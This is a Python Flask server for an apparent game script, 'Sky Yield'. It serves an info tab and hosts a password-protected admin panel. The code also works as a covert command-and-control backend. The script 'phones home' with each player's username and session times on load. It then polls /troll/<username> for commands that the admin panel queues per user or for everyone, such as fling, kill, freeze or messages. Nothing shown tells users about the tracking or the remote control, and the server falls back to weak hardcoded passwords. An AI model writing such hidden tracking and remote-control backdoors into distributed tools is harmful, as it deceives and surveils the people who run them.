"""
SkyYield Admin Server
Deploy on Railway — permanent URL forever.
/info        → public JSON for in-game info tab
/track       → POST: script phones home with username on load
/troll/<usr> → GET: script polls for commands
/admin       → browser-based admin panel (password protected)
"""

from flask import Flask, jsonify, request, render_template_string, redirect, session
import json, os, datetime, collections

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "skyyield-change-me")
ADMIN_PASSWORD  = os.environ.get("ADMIN_PASSWORD", "skyyield123")

# ─────────────────────────────────────────────────────────────
# Data files
# ─────────────────────────────────────────────────────────────
INFO_FILE  = "info.json"
USERS_FILE = "users.json"
TROLL_FILE = "trolls.json"

DEFAULT_INFO = {
    "title":        "Sky Yield",
    "version":      "2.0.0",
    "author":       "Daffa",
    "description":  "Radar, tracking & zoom tool.\nMacOS-style UI.",
    "discord":      "N/A",
    "credits":      "Made by Daffa",
    "status":       "✅ Online",
    "last_updated": datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC"),
    "changelog":    ["v2.0.0 — Full macOS UI rewrite","v1.5.0 — Added zoom bar","v1.0.0 — Initial release"],
}

def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path) as f: return json.load(f)
        except: pass
    return default.copy() if isinstance(default, dict) else default

def save_json(path, data):
    with open(path, "w") as f: json.dump(data, f, indent=2)

# ─────────────────────────────────────────────────────────────
# Public API
# ─────────────────────────────────────────────────────────────
@app.route("/info")
def get_info():
    return jsonify(load_json(INFO_FILE, DEFAULT_INFO))

@app.route("/ping")
def ping():
    return jsonify({"ok": True})

@app.route("/track", methods=["POST"])
def track():
    try:
        data = request.get_json(force=True, silent=True) or {}
        username    = str(data.get("username",    "unknown"))[:50]
        displayname = str(data.get("displayname", username))[:50]
        game_id     = str(data.get("game",        "unknown"))[:30]
    except:
        return jsonify({"ok": False}), 400

    users = load_json(USERS_FILE, {})
    now   = datetime.datetime.utcnow()
    ts    = now.isoformat()

    if username not in users:
        users[username] = {
            "displayname": displayname,
            "game":        game_id,
            "first_seen":  ts,
            "last_seen":   ts,
            "uses":        [],
        }
    else:
        users[username]["last_seen"]   = ts
        users[username]["displayname"] = displayname

    # Append this session timestamp (keep last 500 per user)
    uses = users[username].setdefault("uses", [])
    uses.append(ts)
    if len(uses) > 500:
        users[username]["uses"] = uses[-500:]

    save_json(USERS_FILE, users)
    return jsonify({"ok": True})

@app.route("/troll/<username>", methods=["GET"])
def get_troll(username):
    trolls = load_json(TROLL_FILE, {})
    if username in trolls:
        cmd = trolls.pop(username)
        save_json(TROLL_FILE, trolls)
        return jsonify(cmd)
    return jsonify({}), 204

# ─────────────────────────────────────────────────────────────
# Stats helpers
# ─────────────────────────────────────────────────────────────
def get_stats(users):
    now   = datetime.datetime.utcnow()
    week  = now - datetime.timedelta(days=7)
    month = now - datetime.timedelta(days=30)
    year  = now - datetime.timedelta(days=365)

    total_uses  = 0
    week_uses   = 0
    month_uses  = 0
    year_uses   = 0
    daily = collections.defaultdict(int)

    for u in users.values():
        for ts in u.get("uses", []):
            try:
                t = datetime.datetime.fromisoformat(ts)
            except:
                continue
            total_uses += 1
            if t >= week:
                week_uses += 1
                daily[t.strftime("%a")] += 1
            if t >= month:
                month_uses += 1
            if t >= year:
                year_uses += 1

    return {
        "total_users": len(users),
        "total_uses":  total_uses,
        "week_uses":   week_uses,
        "month_uses":  month_uses,
        "year_uses":   year_uses,
        "daily":       dict(daily),
    }

# ─────────────────────────────────────────────────────────────
# Admin HTML
# ─────────────────────────────────────────────────────────────
ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>SkyYield Admin</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text',Helvetica,sans-serif;
     background:#1c1c1e;color:#f5f5f7;min-height:100vh}
.topbar{background:#2c2c2e;padding:0 24px;height:52px;
        display:flex;align-items:center;justify-content:space-between;
        border-bottom:1px solid #3a3a3c;position:sticky;top:0;z-index:100}
.topbar-title{font-size:15px;font-weight:700}
a.signout{font-size:12px;color:#ff453a;text-decoration:none}
.container{max-width:900px;margin:0 auto;padding:24px 16px 60px}
.section-title{font-size:10px;font-weight:700;letter-spacing:.08em;
               text-transform:uppercase;color:#636366;
               border-bottom:1px solid #3a3a3c;padding-bottom:8px;margin:28px 0 14px}
/* Stats grid */
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin-bottom:8px}
.stat-card{background:#2c2c2e;border-radius:12px;padding:16px;text-align:center}
.stat-num{font-size:28px;font-weight:700;color:#0a84ff}
.stat-label{font-size:11px;color:#636366;margin-top:4px}
/* Table */
table{width:100%;border-collapse:collapse;font-size:13px}
th{text-align:left;padding:8px 12px;color:#636366;font-weight:600;
   font-size:10px;text-transform:uppercase;border-bottom:1px solid #3a3a3c}
td{padding:10px 12px;border-bottom:1px solid #2a2a2c;vertical-align:middle}
tr:hover td{background:rgba(255,255,255,0.03)}
.badge{display:inline-block;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:600}
.badge-blue{background:rgba(10,132,255,.2);color:#0a84ff}
.badge-green{background:rgba(48,209,88,.15);color:#30d158}
.badge-orange{background:rgba(255,159,10,.15);color:#ff9f0a}
/* Buttons */
.btn{display:inline-block;padding:7px 14px;border-radius:8px;font-size:12px;
     font-weight:600;cursor:pointer;border:none;font-family:inherit;transition:opacity .15s}
.btn:hover{opacity:.85}
.btn-red{background:#ff453a;color:#fff}
.btn-orange{background:#ff9f0a;color:#fff}
.btn-blue{background:#0a84ff;color:#fff}
.btn-purple{background:#bf5af2;color:#fff}
.btn-green{background:#30d158;color:#000}
.btn-sm{padding:4px 10px;font-size:11px}
/* Forms */
input[type=text],input[type=password],textarea,select{
  width:100%;background:#2c2c2e;border:1px solid #3a3a3c;border-radius:8px;
  color:#f5f5f7;padding:9px 12px;font-size:13px;font-family:inherit;outline:none}
input:focus,textarea:focus,select:focus{border-color:#0a84ff}
label{display:block;font-size:11px;color:#98989a;margin-bottom:5px;margin-top:12px}
.flash{background:#1a3a1a;border:1px solid #30d158;color:#30d158;
       border-radius:8px;padding:10px 14px;font-size:13px;margin-bottom:16px}
.flash.error{background:#3a1a1a;border-color:#ff453a;color:#ff453a}
.card{background:#2c2c2e;border-radius:12px;padding:16px;margin-bottom:10px}
.row{display:flex;gap:10px;align-items:flex-end;flex-wrap:wrap}
.login-wrap{max-width:360px;margin:80px auto;background:#2c2c2e;
            border-radius:14px;padding:32px;border:1px solid #3a3a3c}
/* Troll row */
.troll-row{display:flex;gap:6px;flex-wrap:wrap;align-items:center}
.username-mono{font-family:'SF Mono',monospace;font-size:12px;color:#0a84ff}
</style>
</head>
<body>
{% if not logged_in %}
<div class="login-wrap">
  <div style="font-size:20px;font-weight:700;margin-bottom:24px">SkyYield Admin</div>
  {% if error %}<div class="flash error">{{ error }}</div>{% endif %}
  <form method="POST" action="/admin/login">
    <label>Password</label>
    <input type="password" name="password" autofocus placeholder="Enter password">
    <button class="btn btn-blue" style="width:100%;margin-top:16px;padding:11px">Sign In</button>
  </form>
</div>

{% else %}
<div class="topbar">
  <div style="display:flex;align-items:center;gap:16px">
    <span class="topbar-title">SkyYield Admin</span>
    <span style="font-size:11px;color:#636366">{{ stats.total_users }} users · {{ stats.total_uses }} total uses</span>
  </div>
  <a class="signout" href="/admin/logout">Sign out</a>
</div>

<div class="container">
{% if saved %}<div class="flash">✓ Saved successfully</div>{% endif %}
{% if trolled %}<div class="flash">✓ Troll command queued for {{ trolled }}</div>{% endif %}

<!-- Stats -->
<div class="section-title">Usage Statistics</div>
<div class="stats">
  <div class="stat-card"><div class="stat-num">{{ stats.total_users }}</div><div class="stat-label">Total Users</div></div>
  <div class="stat-card"><div class="stat-num">{{ stats.week_uses }}</div><div class="stat-label">This Week</div></div>
  <div class="stat-card"><div class="stat-num">{{ stats.month_uses }}</div><div class="stat-label">This Month</div></div>
  <div class="stat-card"><div class="stat-num">{{ stats.year_uses }}</div><div class="stat-label">This Year</div></div>
  <div class="stat-card"><div class="stat-num">{{ stats.total_uses }}</div><div class="stat-label">All Time</div></div>
</div>

<!-- User list -->
<div class="section-title">Players Using Sky Yield</div>
{% if users %}
<table>
  <thead><tr>
    <th>Username</th><th>Display Name</th><th>Game</th>
    <th>First Seen</th><th>Last Seen</th><th>Uses</th><th>Troll</th>
  </tr></thead>
  <tbody>
  {% for username, u in users.items()|sort(attribute='1.last_seen', reverse=True) %}
  <tr>
    <td><span class="username-mono">{{ username }}</span></td>
    <td>{{ u.displayname }}</td>
    <td><span class="badge badge-blue">{{ u.game }}</span></td>
    <td style="color:#636366;font-size:11px">{{ u.first_seen[:16] }}</td>
    <td style="color:#636366;font-size:11px">{{ u.last_seen[:16] }}</td>
    <td><span class="badge badge-green">{{ u.uses|length }}</span></td>
    <td>
      <div class="troll-row">
        <form method="POST" action="/admin/troll">
          <input type="hidden" name="username" value="{{ username }}">
          <select name="command" style="width:90px;padding:4px 6px;font-size:11px">
            <option value="fling">🚀 Fling</option>
            <option value="kill">💀 Kill</option>
            <option value="spin">🌀 Spin</option>
            <option value="freeze">🧊 Freeze</option>
            <option value="msg">💬 Message</option>
          </select>
          <input type="text" name="message" placeholder="msg text" style="width:90px;padding:4px 6px;font-size:11px">
          <button class="btn btn-orange btn-sm" type="submit">Send</button>
        </form>
      </div>
    </td>
  </tr>
  {% endfor %}
  </tbody>
</table>
{% else %}
<p style="color:#636366;padding:20px 0">No users tracked yet. Users appear here when they load the script.</p>
{% endif %}

<!-- Troll all -->
<div class="section-title">Troll Everyone</div>
<div class="card">
  <form method="POST" action="/admin/troll_all">
    <div class="row">
      <div style="flex:1;min-width:120px">
        <label>Command</label>
        <select name="command">
          <option value="fling">🚀 Fling</option>
          <option value="kill">💀 Kill</option>
          <option value="spin">🌀 Spin</option>
          <option value="freeze">🧊 Freeze</option>
          <option value="msg">💬 Message</option>
        </select>
      </div>
      <div style="flex:2;min-width:160px">
        <label>Message (if using msg)</label>
        <input type="text" name="message" placeholder="your message here">
      </div>
      <div>
        <label>&nbsp;</label>
        <button class="btn btn-red" type="submit">Send to ALL</button>
      </div>
    </div>
  </form>
</div>

<!-- Info editor -->
<div class="section-title">Script Info Panel</div>
<form method="POST" action="/admin/save">
  <div class="card">
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
      <div><label>Title</label><input type="text" name="title" value="{{ info.title }}"></div>
      <div><label>Version</label><input type="text" name="version" value="{{ info.version }}"></div>
      <div><label>Author</label><input type="text" name="author" value="{{ info.author }}"></div>
      <div><label>Status</label><input type="text" name="status" value="{{ info.status }}"></div>
      <div><label>Discord</label><input type="text" name="discord" value="{{ info.discord }}"></div>
      <div><label>Credits</label><input type="text" name="credits" value="{{ info.credits }}"></div>
    </div>
    <label>Description</label>
    <textarea name="description" rows="3">{{ info.description }}</textarea>
    <label>Changelog (one entry per line)</label>
    <textarea name="changelog" rows="5">{{ info.changelog | join('\n') }}</textarea>
    <div style="margin-top:14px">
      <button class="btn btn-blue" type="submit">Save & Publish</button>
    </div>
  </div>
</form>

</div>
{% endif %}
</body>
</html>
"""

# ─────────────────────────────────────────────────────────────
# Admin routes
# ─────────────────────────────────────────────────────────────
@app.route("/admin")
def admin():
    if not session.get("admin"):
        return render_template_string(ADMIN_HTML, logged_in=False, error=None)
    users  = load_json(USERS_FILE, {})
    info   = load_json(INFO_FILE, DEFAULT_INFO)
    stats  = get_stats(users)
    return render_template_string(ADMIN_HTML,
        logged_in=True, users=users, info=info, stats=stats,
        saved=request.args.get("saved"),
        trolled=request.args.get("trolled"),
        request=request)

@app.route("/admin/login", methods=["POST"])
def admin_login():
    if request.form.get("password") == ADMIN_PASSWORD:
        session["admin"] = True
        return redirect("/admin")
    return render_template_string(ADMIN_HTML,
        logged_in=False, error="Wrong password")

@app.route("/admin/logout")
def admin_logout():
    session.clear()
    return redirect("/admin")

@app.route("/admin/save", methods=["POST"])
def admin_save():
    if not session.get("admin"): return redirect("/admin")
    f = request.form
    changelog = [l.strip() for l in f.get("changelog","").splitlines() if l.strip()]
    data = {
        "title":        f.get("title","").strip(),
        "version":      f.get("version","").strip(),
        "author":       f.get("author","").strip(),
        "status":       f.get("status","").strip(),
        "description":  f.get("description","").strip(),
        "discord":      f.get("discord","").strip(),
        "credits":      f.get("credits","").strip(),
        "changelog":    changelog,
        "last_updated": datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC"),
    }
    save_json(INFO_FILE, data)
    return redirect("/admin?saved=1")

@app.route("/admin/troll", methods=["POST"])
def admin_troll():
    if not session.get("admin"): return redirect("/admin")
    username = request.form.get("username","").strip()
    command  = request.form.get("command","fling").strip()
    message  = request.form.get("message","").strip()
    if not username: return redirect("/admin")
    trolls = load_json(TROLL_FILE, {})
    trolls[username] = {"command": command, "message": message}
    save_json(TROLL_FILE, trolls)
    return redirect(f"/admin?trolled={username}")

@app.route("/admin/troll_all", methods=["POST"])
def admin_troll_all():
    if not session.get("admin"): return redirect("/admin")
    command = request.form.get("command","fling").strip()
    message = request.form.get("message","").strip()
    users  = load_json(USERS_FILE, {})
    trolls = load_json(TROLL_FILE, {})
    for username in users:
        trolls[username] = {"command": command, "message": message}
    save_json(TROLL_FILE, trolls)
    return redirect("/admin?trolled=everyone")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
